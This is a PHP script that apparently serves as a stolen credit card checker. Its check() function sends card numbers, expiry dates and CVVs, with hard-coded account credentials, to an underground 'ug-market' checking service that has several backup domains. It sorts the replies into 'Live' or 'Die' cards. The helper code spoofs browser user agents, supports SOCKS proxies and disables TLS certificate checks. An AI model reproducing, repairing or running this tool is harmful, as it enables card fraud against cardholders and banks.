<?php

set_time_limit(0);

function debug($html, $file = "", $stop = false) {
    if ($file == "") {
        echo "<textarea style=\"width:100%;height:50%;\" wrap=\"off\">" . htmlentities($html) . "</textarea>";
    } else {
        $fp = fopen($file, 'w');
        fwrite($fp, $html);
        fclose($fp);
    }
    if ($stop) {
        die();
    }
}

function getBetween($content, $start, $end) {
    $r = explode($start, $content);
    if (isset($r[1])) {
        $r = explode($end, $r[1]);
        if ($r[0] == '')
            return 'unknown';
        return $r[0];
    }
    return 'unknown';
}

function createLoad() {
    global $ch, $cookie_jar_path, $cookie_file_path;
    preg_match("/(^.+\/)(.*)/", $_SERVER['SCRIPT_FILENAME'], $linkfolder);
    $string = md5(time() . rand(0, 999));
    $cookie_jar_path = $linkfolder[1] . '/cookie/' . $linkfolder[2] . "_" . $string . '_jar.txt';
    $fp = fopen($cookie_jar_path, 'wb');
    fclose($fp);
    $cookie_file_path = $linkfolder[1] . '/cookie/' . $linkfolder[2] . "_" . $string . '_file.txt';
    $fp = fopen($cookie_file_path, 'wb');
    fclose($fp);
    $ch = curl_init();
}

function load($url, $post = '', $socks = '', $h = false, $nobody = false, $referer = '', $timeout = 30, $ua = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8') {
    global $ch, $cookie_jar_path, $cookie_file_path, $error;
    curl_setopt($ch, CURLOPT_URL, $url);
    if ($h != false) {
        curl_setopt($ch, CURLOPT_HEADER, TRUE);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
    } else {
        curl_setopt($ch, CURLOPT_HEADER, FALSE);
    }
    curl_setopt($ch, CURLOPT_NOBODY, $nobody);
    @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_jar_path);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_path);
    curl_setopt($ch, CURLOPT_VERBOSE, true);
    if ($ua)
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    if ($referer)
        curl_setopt($ch, CURLOPT_REFERER, $referer);
    if (strncmp($url, "https", 6)) {
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    }
    if ($socks) {
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
        curl_setopt($ch, CURLOPT_PROXY, $socks);
        if ($type == 3) {
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        } else if ($type == 4) {
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
        } else {
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        }
    }
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    $data = curl_exec($ch);
    $error = curl_error($ch);
    //echo $error;
    if ($data)
        Return $data;
    //else Return $error;
    else
        Return false;
}

function closeLoad() {
    global $ch, $cookie_jar_path, $cookie_file_path;
    @curl_close($ch);
    @ob_end_clean();
    @unlink($cookie_jar_path);
    @unlink($cookie_file_path);
}

//function check($ccnum, $ccmonth, $ccyear, $cccvv) {
////1 = LIVE
////2 = DEAD
////3 = UNKNOWN
//return 3;
//}


function check($ccnum, $ccm, $ccy, $cvv) {
    $user = "proccadmin1"; // Your Username
    $pwd = "proccadmin1"; // Your Password
    $gate = "checkcvv9";  // The tool you want to checking with
    $url1 = "https://www.ug-market.com/ugm/xcheck.php"; // Main domain
    $url2 = "https://www.ug-market.is/ugm/xcheck.php"; // Backup domain (2nd main)
    $url3 = "https://www.ug-market.net/ugm/xcheck.php"; // Backup domain
    $url4 = "https://ugrn.linkzip.pw/ugm/xcheck.php";  // Backup domain
    $url = $url4; // Change this (to $url1, $url2, or $url3,...) in case there's a problem with the default domain

    $data = "user=" . $user . "&pwd=" . $pwd . "&gate=" . $gate . "&cc=" . $ccnum . "|" . $ccm . "|" . $ccy . "|" . $cvv;
    if (!function_exists('curl_exec')) {
        return -10;
    }
    $send = _curl($url, $data);
    echo "<br/>Response = ";
    echo $send;
    if (is_numeric($send)) {
        return $send; // http_code error, may returned: 0, 301, 302, 403, 525, ...
    } else {
        $result = strBw($send, 'Status=', '_'); // Get response from API's result
        if ($result == "") {
            return -2;
        } elseif ($result == "Invalid") {
            return -1;
        } elseif ($result == "Live") {
            return 1;
        } elseif ($result == "Live2") {
            return 11;
        } elseif ($result == "Die") {
            return 2;
        } elseif ($result == "Unknown") {
            return 5;
        } elseif ($result == "CantCheck") {
            return 6;
        } elseif ($result == "Error") {
            return 3;
        } else {
            return 4;
        }
    }
}

// Some functions to send data:
function _curl($url, $post = "") {
    $ch = curl_init();
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0"); // You'll be blocked if not set USERAGENT
    if (stristr($url, "https")) {
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    }
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 4); // Set connection timeout
    curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Set curl timeout (total time)
    $result = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);
    if ($info['http_code'] != "200") {
        return $info['http_code'];
    } else
        return $result;
}

function strBw($string, $start, $end) {
    $out = explode($start, $string);
    if (isset($out[1])) {
        $string = explode($end, $out[1]);
        return $string[0];
    }

    return '';
}

?>